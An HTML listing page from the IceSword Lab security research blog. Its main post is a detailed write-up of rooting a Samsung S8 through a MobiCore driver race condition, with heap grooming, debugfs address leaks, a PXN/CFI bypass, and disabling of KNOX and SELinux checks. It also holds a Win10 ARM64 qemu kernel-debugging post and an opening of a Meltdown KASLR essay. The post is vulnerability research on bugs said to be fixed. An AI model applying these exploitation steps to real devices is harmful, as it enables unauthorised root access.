<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-114832940-2', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->


  
  <title>IceSword Lab</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="IceSword Lab | 冰刃实验室">
<meta property="og:type" content="website">
<meta property="og:title" content="IceSword Lab">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="IceSword Lab">
<meta property="og:description" content="IceSword Lab | 冰刃实验室">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="IceSword Lab">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="../../atom.xml" title="IceSword Lab" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.ico">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="../../css/style.css">

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="../../index.html" id="logo">IceSword Lab</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="../../index.html" id="subtitle">Work hard in silence , let success make the noise.</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="../../index.html">Home</a>
        
          <a class="main-nav-link" href="../../archives">Archives</a>
        
          <a class="main-nav-link" href="../../research">Research</a>
        
          <a class="main-nav-link" href="../../vulnerabilities">Vulnerabilities</a>
        
          <a class="main-nav-link" href="../../recruitment">Recruitment</a>
        
          <a class="main-nav-link" href="../../about">About</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="../../atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-2018/07/25/kdhack" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="../../2018/07/25/kdhack/" class="article-date">
  <time datetime="2018-07-25T10:06:40.000Z" itemprop="datePublished">2018-07-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="../../2018/07/25/kdhack/">开启Win10RS4ARM64远程内核调试之旅</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="author-wup-and-suezi-of-IceSword-Lab-Qihoo-360"><a href="#author-wup-and-suezi-of-IceSword-Lab-Qihoo-360" class="headerlink" title="author : wup and suezi of IceSword Lab , Qihoo 360  "></a>author : wup and suezi of IceSword Lab , Qihoo 360  </h2><p><span id="top"></span><br>&emsp;&emsp;今年6月，微软联合一线笔记本厂商正式发布了搭载高通骁龙处理器的Windows 10笔记本产品。作为主角的Win10 ARM64，自然亮点无数，对PC设备厂商也是各种利好。实际上，为了与厂商同步发布安全防护产品，IceswordLab的小伙伴早已将底层驱动程序集移植到了Win10 ARM64平台上，笔者也因此积累了一些有趣的内核调试方法。在x86平台使用vmware等虚拟机软件搭建远程内核调试环境是非常方便有效的办法，但目前Win10 ARM64平台没有这样的虚拟机软件，于是笔者利用qemu模拟器DIY一个。</p>
<h2 id="0x0-准备试验环境"><a href="#0x0-准备试验环境" class="headerlink" title="0x0 准备试验环境"></a>0x0 准备试验环境</h2><p>物理机系统环境 ：Windows10 RS4 x64<br>虚拟化软件qemu ： qemu-w64-setup-20180519.exe<br>虚拟机系统环境 ：Windows10 RS4 ARM64<br>UEFI 模块 ： Linaro 17.08 QEMU_EFI.fd<br>WINDBG ：WDK10 (amd64fre-rs3-16299)附带的WinDBG  </p>
<h2 id="0x1-qemu远程内核调试开启失败"><a href="#0x1-qemu远程内核调试开启失败" class="headerlink" title="0x1 qemu远程内核调试开启失败"></a>0x1 qemu远程内核调试开启失败</h2><p>&emsp;&emsp;在qemu环境下，我们使用Linaro.org网站提供的针对QEMU(AARCH64)的1708版的UEFI文件QEMU_EFI.fd启动Win10ARM64的系统，并使用bcdedit修改qemu模拟器里的Win10ARM64的启动配置以实现远程内核调试。配置如下图，<br><img src="/2018/07/25/kdhack/00.png" alt title="qemu+aarch64+debug"></p>
<p>我们遇到了两个问题：<br>（1） 以“-serial pipe:com_1”参数启动qemu模拟器，qemu会被卡住，导致虚拟机系统无法启动；<br>（2）无论是否开启了基于串口的远程内核调试，系统内核加载的都是kd.dll而非预期的kdcom.dll;  </p>
<p>对于问题（1），我们利用qemu串口转发功能，开发一个代理程序：建立一个namedpipe等待windbg的连接，并建立与qemu串口socket服务器的连接，从而实现将pipe上读取(ReadFile)的数据写入(send)到socket、将socket上读取(recv)的数据写入(WriteFile)到pipe。如此我们解决了问题（1）。<br>至于问题（2），对比VMWare里用UEFI方式部署的Win10RS4x64，不开启内核调试时系统加载的是kd.dll，开启内核调试时系统加载的是kdcom.dll，下面对其进一步分析。 </p>
<h2 id="0x2-系统提供的kdcom-dll存在问题"><a href="#0x2-系统提供的kdcom-dll存在问题" class="headerlink" title="0x2 系统提供的kdcom.dll存在问题"></a>0x2 系统提供的kdcom.dll存在问题</h2><p>&emsp;&emsp;在Win10RS4ARM64安装镜像的预置驱动里，无法找到serial.sys这个经典的串口驱动；而Win10ARM64笔记本的串口设备是存在的，且串口驱动是高通官方提供的。实际上通过串口远程调试windows，系统正常的启动过程中，调试子系统的初始化是早先于串口驱动程序，调试子系统调用kdcom.dll提供的功能，并不需要串口驱动程序的支持。因此微软没有为Win10RS4ARM64提供串口驱动serial.sys，对我们最终的目标没有影响。  </p>
<p>那么问题究竟出在哪里呢？是因为Loader所使用的Qemu中的UEFI有问题吗？  </p>
<p>对照qemu的源码可知，qemu为aarch64模拟器环境提供了串口设备PL011。我们研究了Linaro UEFI的源码EDK2并编译了对应的UEFI文件，确保使用的UEFI文件确实提供了串口功能。再用与Win10ARM64模拟器同样的配置安装了Ubuntu for ARM，在这个模拟器里PL011串口通信正常，串口采用MMIO，其映射的基址为0x09000000。但安装Win10后问题依旧：以基于串口的远程内核调试的启动配置来启动Win10RS4ARM64，系统加载的是kd.dll而非期望的kdcom.dll，故而推测是winload 没有识别PL011串口设备、没能去加载kdcom.dll。由此，我们决定直接将kdcom.dll替换kd.dll来使用。不过使用kdcom.dll替换kd.dll后出现了新的问题——系统引导异常，下面进一步分析其原因。  </p>
<p>kdcom!KdCompInitialize是串口初始化的关键函数，分析它是如何初始化并使用串口设备的。系统第一次调用kdcom!KdInitialize初始化串口时，传递给KdCompInitialize的第二个参数LoaderBlock是nt!KeLoaderBlock,非NULL，此时kdcom!KdCompInitialize里的关键流程如下：<br>(1)    HalPrivateDispatchTable-&gt;KdEnumerateDebuggingDevices已被赋值为hal!HalpKdEnumerateDebuggingDevices，调用返回0xC0000001;<br>(2)    串口处理器UartHardwareDriver为NULL，没有被赋值；<br>(3)    HalPrivateDispatchTable-&gt;KdGetAcpiTablePhase0已被赋值为hal!HalAcpiGetTable，<br>调用HalAcpiGetTable(loaderBlock, ‘2GBD’)返回NULL,<br>调用HalAcpiGetTable(loaderBlock, ‘PGBD’)返回NULL,<br>因此gDebugPortTable为NULL;<br>(4)    参数LoaderBlocker非NULL且gDebugPortTable为NULL，调用GetDebugAddressFromComPort来配置串口地址；<br>GetDebugAddressFromComPort调用nt!KeFindConfigurationEntry失败，按照既定策略，基于DebugPortId的值指派串口地址（DebugPort.Address）为0x3F8/0x2F8/0x3E8/0x2E8/0x00五者之一;<br>(5)    由于gDebugPortTable为NULL,串口处理器UartHardwareDriver赋值为Uart16550HardwareDriver；<br>由于串口地址（DebugPort.Address）非NULL，调用串口初始化函数UartHardwareDriver-&gt;InitializePort初始化串口;<br>模拟器提供的串口设备为PL011, 串口处理器应被赋值为是PL011HardwareDriver 而非Uart16550HardwareDriver;  </p>
<p>至此，我们发现导致异常的原因： 模拟器提供的是PL011串口设备,  kdcom.dll虽提供了支持PL011的代码，但未能正确识别适配，依然把它当成了PC的isa-serial串口设备。这应属于kdcom.dll的bug。  </p>
<h2 id="0x3-开启qemu远程内核调试"><a href="#0x3-开启qemu远程内核调试" class="headerlink" title="0x3 开启qemu远程内核调试"></a>0x3 开启qemu远程内核调试</h2><p>&emsp;&emsp;现在看来，我们需要解决的问题有两个：系统Loader仅加载不支持远程内核调试的kd.dll，系统模块kdcom.dll没能完全支持PL011串口设备。  </p>
<p>对于第一个问题，我们简单采取文件替换的办法绕过它。<br>对于第二个问题，预期可以使用这样的办法解决：开发一个boot类型的驱动，让它能够加载kdcom.dll并主动修正kdcom.dll中所有相关数据，对内核映像Ntoskrnl.exe执行IATHook——把导入地址表中的kd.dll函数地址全部替换成kdcom.dll对应函数地址，最后执行nt!KdInitSystem来初始化调试子系统。这种方案篡改内核数据后，会很快触发PatchGuard蓝屏，因此我们需要设计出一个更可用的方案。  </p>
<p>我们可以开发一个能够实现远程内核调试所需的串口通信功能的dll（即没有BUG的kdcom.dll）来替换系统目录下kd.dll，在“禁用驱动程序强制签名”的场景下实现对操作系统初始化流程的劫持。  </p>
<p>微软给WINDBG的安装包捆入了一个名为KdSerial的示例项目。这个项目缺少了一些代码，但是关键的部分都在。通过笔者的改造，成功编译得到一个kdserial.dll，它拥有远程内核调试所需的串口通信功能和正确的PL011串口配置，能够替代Win10ARM64RS4系统里的kdcom.dll。将这个kdserial.dll替换系统里的kd.dll，开机时选择“启动设置”菜单里的“禁止驱动程序强制签名”，达成远程内核调试Win10RS4ARM64的目标。  </p>
<p><img src="/2018/07/25/kdhack/01.png" alt title="qemu+aarch64+win10rs4+windbg"></p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] Windows Internals 6th<br>[2] https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/bcdedit--dbgsettings<br>[3] https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/bcd-boot-options-reference<br>[4] https://wiki.linaro.org/LEG/UEFIforQEMU<br>[5] https://blog.csdn.net/iiprogram/article/details/2298550  </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/07/25/kdhack/" data-id="cmd5slr2a000d0lo1guipdcaa" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2018/04/20/samsung-root" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="../../2018/04/20/samsung-root/" class="article-date">
  <time datetime="2018-04-20T00:00:00.000Z" itemprop="datePublished">2018-04-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="../../2018/04/20/samsung-root/">利用一个竞态漏洞root三星s8的方法</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>author : <a href="http://weibo.com/spinlock2014" target="_blank">zjq(@spinlock2014)</a> of IceSword Lab , Qihoo 360</p>
<hr>
<p><span id="top"></span></p>
<p>&emsp;  在安卓阵营中，三星手机可以说是最重视安全的了，各种mitigation技术都是早于官方系统应用到自己手机上，并且加入了KNOX技术，在内核层设置了重重校验，提高了手机root难度。17年下半年，研究过一段时间三星手机s8的内核安全问题，发现了一些比较有意思的漏洞。本文中，将介绍一个race condition漏洞，利用此漏洞绕过KALSR，PXN，CFI，KNOX2.8等拿到了s8内核root权限。目前这些漏洞都已经被修复。</p>
<h2 id="0x0-MobiCore驱动的提权漏洞-回页首"><a href="#0x0-MobiCore驱动的提权漏洞-回页首" class="headerlink" title="0x0 MobiCore驱动的提权漏洞 回页首"></a>0x0 MobiCore驱动的提权漏洞 <a href="#top">回页首</a></h2><p><span id="overview"></span></p>
<p>&emsp;  在MobiCore驱动中，ioct的MC_IO_GP_REGISTER_SHARED_MEM接口会从slab中分配一块cwsm buffer，MC_IO_GP_RELEASE_SHARED_MEM接口用来释放cwsm buffer和相关资源。但是在释放过程中，由于没有加锁，存在race condition进而导致double free的可能：</p>
<p><img src="/2018/04/20/samsung-root/0.png" alt>   </p>
<p>&emsp;  看此函数的实现，首先从链表中查找获取该内存块，并将引用计数加1以持有该cwsm buffer。然后通过连续两个cwsm_put函数减去引用计数并释放cwsm  buffer。cwsm_put的实现是引用计数减1，然后检查引用计数是否为0，如果为0，则执行cwsm_release函数释放cwsm，如下所示：<br><img src="/2018/04/20/samsung-root/1.png" alt><br>&emsp;  正常情况下，创建该buffer时引用计数被设为1，cwsm_find查找该buffer时引用计数加1，第一个cwsm_put调用减去cwsm_find持有的引用计数，然后第二个cwsm_put将引用计数减为0，并调用cwsm_release释放资源。<br>但在client_gp_release_shared_mem函数中，由于cwsm_find和两个cwsm_put之间并未加锁保护，使获取cwsm和释放cwsm不是原子操作，当race condition发生时，多个线程在cwsm被释放前调用cwsm_find获取该buffer后，接下来的多次cwsm_put调用则可以触发对cwsm的double free。</p>
<p>&emsp;  我们再看cwsm_release这个函数，还是比较复杂的：<br><img src="/2018/04/20/samsung-root/2.png" alt><br>其中，cwsm的结构为：<br><img src="/2018/04/20/samsung-root/3.png" alt>   </p>
<p>&emsp;  仔细分析cwsm_release函数，我们会发现，这个函数中当race condition发生时， tee_mmu_delete(cwsm-&gt;mmu) 会造成cwsm-&gt;mmu 的double free， client_put(client) 会造成cwsm-&gt;client的double free，最后kfree(cwsm) 也会造成cwsm的double free。三个大小不一的slab内存块同时double free，极易引起内核崩溃，除非我们在cwsm第一次被释放后占住该内存，从而控制内存中内容，改变第二次执行此函数中的流程。而list_del_init(&amp;cwsm-&gt;list)这一句：<br><img src="/2018/04/20/samsung-root/4.png" alt><br><img src="/2018/04/20/samsung-root/5.png" alt><br>如果我们可以控制cwsm的内容，也就是list-&gt;next 和list-&gt;prev指针的值，则可以做成一个任意地址写。</p>
<h2 id="0x1-利用方案-回页首"><a href="#0x1-利用方案-回页首" class="headerlink" title="0x1 利用方案 回页首"></a>0x1 利用方案 <a href="#top">回页首</a></h2><p>&emsp;  从client_gp_release_shared_mem函数中可以看到，调用cwsm_find获得buffer和调用cwsm_put释放buffer时间间隙极小，如何能提高race condition的成功率，有效控制指针，并能尽可能的降低崩溃率呢？通过对slab中内存分配释放机制的分析，主要采用了几下几个方法:</p>
<ol>
<li>如何增加race condition成功率呢？kmalloc在slab中分配内存块会记录下本线程所在核，kfree释放内存时，如果判断当前线程所在核与分配内存时的所在核一致，则将内存释放到快速缓存链表freelist中，这样当其他线程分配相同大小的内存块时能快速取到，这样可以增加释放后马上占位的成功率；如果释放时判断当前线程所在核与分配内存时的所在核不一致，则将内存释放到page-&gt;freelist中，当其他线程分配内存时，缓存链表中内存耗尽后，才会从此链表中取用，因为时间间隙很小，这会降低占位成功率。所以分配slab内存，释放内存，占位内存的线程最好在同一个核上。假设有0，1，2三个核，线程A在0核上分配了buffer，线程B在0核上释放buffer，同时为了制造race condition需要线程C在1核上释放buffer，同时线程D在0核上，可以调用add_key系统调用来占用线程B释放掉的内存块，并填上我们需要的内容。当然这实际调试中，因为race condition间隙很小，可能需要几个甚至几十几百个线程同时操作来增加成功率。同时，因为race condition间隙很小，可以在0核上增加大量打酱油线程，使其在race condition间隙中获得调用机会，以增大时间间隙，提高占位的成功率；</li>
<li>我们在cwsm double free的第一次释放后将其占住，那么就可以控制其中的内容，填上我们需要的值，因此我们可以将cwsm-&gt;list.next设为一个内核地址，利用list_del_init(&amp;cwsm-&gt;list)再调用__list_del，可以实现内核地址写，比如将ptmx-&gt;check_flags 设置为我们需要的函数指针；</li>
<li>当race condition发生时，多个线程调用cwsm_release时，大小不同的slab块cwsm-&gt;mmu，cwsm-&gt;client和cwsm都会被重复释放，在此情况下，内核大概率会崩。因此，当cwsm第一次释放，我们占住后，需要将cwsm-&gt;client和cwsm-&gt;mmu填上合适的值，防止内核崩溃。我们先看client_put(client) 函数：<br><img src="/2018/04/20/samsung-root/6.png" alt>   </li>
</ol>
<p>&emsp;  这个函数首先引用计数client-&gt;kref减1，如果为0，则调用client_release释放资源。因此我们可以将client-&gt;kref设为大于1的值，防止cwsm-&gt;client被二次释放。<br>再看tee_mmu_delete(cwsm-&gt;mmu)，这一句比较麻烦，它将调用mmu_release函数，看内部实现（片段）：<br><img src="/2018/04/20/samsung-root/7.png" alt><br><img src="/2018/04/20/samsung-root/8.png" alt>   </p>
<p>可以看到，mmu_release 不仅要释放mmu，并且要引用mmu中指针。如果我们能控制cwsm-&gt;mmu，那么我们必须将cwsm-&gt;mmu设为一个合法的slab地址，并且能够控制这个slab中的内容，否则系统将崩溃。幸运的是，我们找到了一个信息泄露漏洞：<br><img src="/2018/04/20/samsung-root/9.png" alt><br>/sys/kernel/debug/ion/event文件将泄露ion中分配的ion_buffer的地址。我们可以利用ion接口分配大量ion_buffer，然后在泄露的地址中查找到连续8k大小（cwsm-&gt;mmu的大小）的ion_buffer内存。然后在ion中占住这一块内存不释放，将其地址填到cwsm-&gt;mmu中，使mmu_release释放此内存块，但因为我们在ion中此内存占住不释放不使用，所以即使被别人重新获得，也可避免内核崩溃。</p>
<h2 id="0x2-Bypass-KALSR-回页首"><a href="#0x2-Bypass-KALSR-回页首" class="headerlink" title="0x2 Bypass KALSR 回页首"></a>0x2 Bypass KALSR <a href="#top">回页首</a></h2><p>Android 8.0之后安卓手机普遍启用了内核地址随机化，而三星手机启用的要更早一些。此漏洞本身泄露内核地址比较困难，所以还需要一个信息泄露漏洞。debugfs 文件系统一直是比较容易出问题的，我们尝试着用简单指令测试了一下：find /sys/kernel/debug | xargs cat，片刻之后，屏幕上打印出了如下信息：<br><img src="/2018/04/20/samsung-root/10.png" alt><br>经过分析，这是/sys/kernel/debug/tracing/printk_formats文件所泄露出来的地址，有些函数地址，比如dpm_suspend，此地址加上一个固定的偏移量即可得到内核启动后的真实函数地址。经过fuzz发现，类似的信息泄露不止一处。</p>
<h2 id="0x3-Bypass-PXN-amp-amp-CFI-回页首"><a href="#0x3-Bypass-PXN-amp-amp-CFI-回页首" class="headerlink" title="0x3 Bypass PXN &amp;&amp; CFI 回页首"></a>0x3 Bypass PXN &amp;&amp; CFI <a href="#top">回页首</a></h2><p>我们曾在16年mosec会议上介绍过几种过PXN方法。其中一个方法是，将函数指针kernel_setsockopt覆盖到ptmx_fops-&gt;check_flags，然后通过控制第一个参数跳转，绕过set_fs(oldfs)语句，当函数执行完，本进程addr_limit被设为0xffffffffffffffff，此时我们可以在用户态通过一些系统调用直接读写内核数据。<br><img src="/2018/04/20/samsung-root/11.png" alt><br>然而在s8上使用此方法时确出现了系统崩溃，仔细检查s8的kernel_sock_ioctl汇编代码时，发现跳转指令改变了，跳转到寄存器的指令改成的直接跳转到固定地址0xffffffc000c56f6c的指令：<br><img src="/2018/04/20/samsung-root/12.png" alt><br>下面看看跳转到0xffffffc000c56f6c这个地址干了些什么：<br><img src="/2018/04/20/samsung-root/13.png" alt><br>如上代码，实际上是对跳转地址做了检查，如果跳转到的地址的上一条语句是0x00be7bad，则认为是合法地址，执行跳转，如果不是则认为是非法地址，执行一条非法语句导致内核崩溃。为什么必须要上一条语句是0x00be7bad呢？原来s8在编译时每一个函数结尾都加上了一句0x00be7bad作为标记，如果上一条语句是0x00be7bad，则表明这个地址是函数的起始地址，否则不是。也就是说，在每一个跳转到寄存器地址之前都要检查地址是否为函数的起始地址，否则非法。<br>虽然此路不通，但是另外一个办法还是可以的。我们找到了一个比较好用的bug，在s2mm005_flash函数中有一个代码片段：<br><img src="/2018/04/20/samsung-root/14.png" alt><br>文件CCIC_DEFAULT_UMS_FW定义为：”/sdcard/Firmware/usbpd/s2mm005.bin”，由于此文件并不存在，当调用到此代码时，filp_open将返回错误，跳到done返回。可以看到错误处理中并没有恢复addr_limit。也就是当调用此函数失败时，本进程将得到读写内核的权限。<br>当然上面这个办法有赖于这个简单的bug，在错误处理中漏掉了set_fs(old_fs)的操作。如果没有这种bug怎么办呢？还是有办法的，我们在内核中找到了这样的函数：<br><img src="/2018/04/20/samsung-root/15.png" alt><br>将此函数地址，利用漏洞覆盖掉ptms_fops-&gt; check_flags指针，当我们调用check_flags时，可以控制第一个入参，那么合理设置参数内容，可以达到读写内核的目的。</p>
<h2 id="0x4-KNOX2-8-amp-amp-SELinux-回页首"><a href="#0x4-KNOX2-8-amp-amp-SELinux-回页首" class="headerlink" title="0x4 KNOX2.8 &amp;&amp; SELinux 回页首"></a>0x4 KNOX2.8 &amp;&amp; SELinux <a href="#top">回页首</a></h2><p>三星手机为了提高手机安全性，加入了KNOX，使内核利用难度大大加强。这里简单介绍一下KNOX2.8在内核中主要实现的特性：</p>
<ol>
<li><p>与root相关的关键数据，比如cred，页表项等需要在特定内存中分配，此内存中通用cpu端被设为只读，当需要修改时，则发送指令通过TrustZone进行修改；</p>
</li>
<li><p>在调用rkp_call让TrustZone执行命令时，TrustZone同样将对数据完整性进行校验，比如commit_creds函数在创建cred后，调用rkp_call时，TrustZone会检查本进程credential是否在只读内存区，检查本进程id是否大于1000，如果大于1000则不能将新创建的credential修改为小于1000的值，这也使得通过调用rkp_override_creds来修改credential用户id的办法不再有效；</p>
</li>
<li><p>在SELinux原有权限管理基础上，增加了额外的完整性校验，这几乎影响所有系统调用接口。以open系统调用为例，当打开CONFIG_RKP_KDP配置项时，增加了security_integrity_current的校验：<br><img src="/2018/04/20/samsung-root/16.png" alt><br><img src="/2018/04/20/samsung-root/17.png" alt><br>可以看到，在security_integrity_current这个函数里，将校验：进程描述符中cred和security是否在只读内存区分配，bp_cred与cred是否一致（防止被修改），bp_task是否就是本进程，mm-&gt;pgd和cred-&gt;bp_pgd是否一致，current-&gt;nsproxy-&gt;mnt_ns-&gt;root和current-&gt;nsproxy-&gt;mnt_ns-&gt;root-&gt;mnt-&gt;bp_mount是否一致。如果其中某一项关键数据被修改而导致检验不通过，则导致系统产生panic，并打印出错误信息；</p>
</li>
<li><p>在load_elf_binary -&gt; flush_old_exec函数中增加校验，如果进程为id小于1000，为内核进程，并且load的二进制文件及不再”/”目录又不在”/system”目录下则内核panic。<br><img src="/2018/04/20/samsung-root/18.png" alt><br>这使得利用用户态调用__orderly_poweroff函数在内核中创建内核线程的方法将被阻止；KNOX还在内核其他地方加入了大量的检验。</p>
</li>
</ol>
<p>KNOX的加入，使得以前常用的一些修改credential 用户id去root办法都比较难办了。随着KNOX版本的迭代，势必会对内核的保护越来越强化。但是就笔者当时研究的KNOX2.8而言，依然还有一些弱点可供利用，进而拿到root权限，读写高权限文件，起内核shell等。</p>
<p>前面提到，KNOX限制root的一个措施就是在大部分系统调用中，都会进行数据完整性校验，如果我们将进程credential修改非只读区，则会校验失败。这些校验函数都是挂接在全局变量security_hook_heads下面，比如open系统调用会调用security_hook_heads下挂的file_open钩子函数，最后调用到selinux_file_open进行权限和数据完整性校验。但是security_hook_heads这个全局变量却是可读写的，我们可以利用漏洞读写内核，将此变量下面挂的钩子函数有选择的设置为NULL，不仅可以绕过该校验，还可以绕过SELinux的检查。比如，我们可以把本进程credential设置为替换为一块可读写内存，将id修改为root用户，同时将和读写相关的校验函数设为NULL。这样可以用root用户稳定的读写系统中高权限文件。进行其他操作时，也可以通过禁用相关校验函数绕过校验，当然这种方法有些简单粗暴，需要小心使用，因为这些校验函数有些和系统耦合紧密，如果不小心很容易引起系统crash，操作完成后应该尽快恢复。在KNOX之前版本中，有研究员曾经通过调用__orderly_poweroff函数，可以利用内核起一个root进程，绕过了commit_creds中的校验，但是KNOX2.8中在load_elf_binary中增加了对用户id和binary路径的校验。然而我们发现，虽然load_elf_binary增加了此校验，但是load_script中却没有加上这个校验，这就意味着，虽然我们不能在内核中加载自己的binary，但是可以起一个root脚本进程，在脚本中进行我们需要的操作。</p>
<h2 id="总结：-回页首"><a href="#总结：-回页首" class="headerlink" title="总结： 回页首"></a>总结： <a href="#top">回页首</a></h2><p>本文介绍了如何利用一个s8中race condition驱动漏洞，一步步绕过KALSR，PXN，CFI，KNOX2.8等mitigation机制，拿到root权限，读写高权限文件，并在内核中起一个shell进程。三星在内核加固方面下了很大功夫，KNOX的引入显著提高了root的难度，随着后面版本的不断迭代，对内核的加固会越来越强，值得持续的跟踪研究。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/04/20/samsung-root/" data-id="cmd5slr28000c0lo1bbq57yj3" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2018/04/09/A-Kernel-Vulnerability-Detection-Framework-based-on-Hardware" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="../../2018/04/09/A-Kernel-Vulnerability-Detection-Framework-based-on-Hardware/" class="article-date">
  <time datetime="2018-04-09T17:50:40.000Z" itemprop="datePublished">2018-04-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="../../2018/04/09/A-Kernel-Vulnerability-Detection-Framework-based-on-Hardware/">A Kernel Vulnerability Detection Framework based on Hardware</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>author : Jianfeng Pan, Guanglu Yan, and Xiaocao Fan, IceSword Lab, 360 Internet Security Center</p>
<h2 id="2018补天白帽大会-PPT"><a href="#2018补天白帽大会-PPT" class="headerlink" title="2018补天白帽大会 PPT"></a>2018补天白帽大会 PPT</h2><h2 id="English"><a href="#English" class="headerlink" title="English"></a>English</h2><p><a href="http://www.iceswordlab.com/2018/04/09/A-Kernel-Vulnerability-Detection-Framework-based-on-Hardware/en.pptx" target="_blank"> A Kernel Vulnerability Detection Framework based on Hardware</a></p>
<h2 id="Chinese"><a href="#Chinese" class="headerlink" title="Chinese"></a>Chinese</h2><p><a href="http://www.iceswordlab.com/2018/04/09/A-Kernel-Vulnerability-Detection-Framework-based-on-Hardware/cn.pptx" target="_blank"> 基于硬件辅助的内核漏洞挖掘框架</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/04/09/A-Kernel-Vulnerability-Detection-Framework-based-on-Hardware/" data-id="cmd5slr2b000e0lo194z43xie" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2018/02/06/meltdown" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="../../2018/02/06/meltdown/" class="article-date">
  <time datetime="2018-02-06T19:22:40.000Z" itemprop="datePublished">2018-02-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="../../2018/02/06/meltdown/">随笔（二）：全补丁下再次利用CPU漏洞攻破KASLR</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>author : https://weibo.com/jfpan</p>
<p>&emsp;&emsp;12月初微博提到微软RS4的内核修改，介绍了其KVA Shadowing方案消除了多种已知硬件边信道攻击，无意中成了当时尚未公开的meltdown CPU漏洞补丁的最早(?)粗略分析。漏洞公布后本想补充写个详细分析的blog，但忙于保障部门驱动与补丁的兼容性故而推迟。几天后发现网上已经遍布翻译的、原创的meltdown/spectre相关文章，再写重复的内容就没什么意义了。所以这篇blog主要是写一些大家没有提到的内容。</p>
<p>&emsp;&emsp;之前短文提到了操作系统抵御meltdown的方案是用户态使用另一份不映射内核绝大多数地址空间的页表（Windows上的KVA Shadowing和Linux上的KPTI，它们源自KAISER），那么已有方案是否完美呢？答案是否定的，下面以微软补丁方案为例介绍一个导致全补丁下KASLR Bypass的简单缺陷。（注意虽说原理极为简单，但为了确认是否能公开，两周前已将缺陷报给了MSRC，刚得到微软确定答复。小小吐槽一下，微软认为其威胁不大、不归于漏洞这点在意料之中，但给的理由又是常用的一个：“This is by design”，给人的感觉就是专门留下这点设计来废掉KASLR，其实KAISER原本就是设计用于防止针对KASLR的边信道攻击，本质上还是算方案设计有遗漏）</p>
